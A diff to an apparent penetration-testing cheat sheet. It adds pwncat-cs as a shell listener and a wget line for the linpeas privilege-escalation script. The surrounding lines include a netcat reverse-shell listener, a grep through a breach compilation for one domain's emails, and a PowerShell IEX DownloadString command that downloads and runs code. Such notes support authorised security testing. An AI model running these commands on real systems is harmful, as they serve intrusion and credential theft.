@@ -33,6 +33,9 @@ zgrep -ia "@domain.de" BreachCompilation.tar.gz
 Listening for shells (bash):
 nc -nvlp 1337
 
+pip3 install pwncat-cs
+python3 -m pwncat :1337
+
 # IMAP (imap, pop3, TSL)
 openssl s_client -connect 10.129.14.128:imaps
 
@@ -63,6 +66,10 @@ XAMPP 	C:\xampp\htdocs\
 # WinPeas in memory (windows, security tool)
 Download:
 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
+
+# LinPeas (linpeas, linux, priv)
+Download:
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
 In Powershell:
 IEX(New-Object Net.WebClient).DownloadString('http://...')
